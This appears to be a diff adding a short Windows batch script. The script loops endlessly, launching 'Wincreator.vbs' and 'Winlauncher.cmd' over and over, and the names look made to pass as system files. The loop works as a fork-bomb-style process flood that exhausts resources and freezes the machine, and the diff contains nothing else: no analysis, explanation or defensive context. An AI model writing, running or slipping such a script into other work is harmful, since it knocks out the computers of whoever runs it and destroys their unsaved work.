@@ -1,0 +1,24 @@
+:loop
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Wincreator.vbs
+start Winlauncher.cmd
+start Wincreator.vbs
+start Wincreator.vbs
+start Winlauncher.cmd
+goto loop
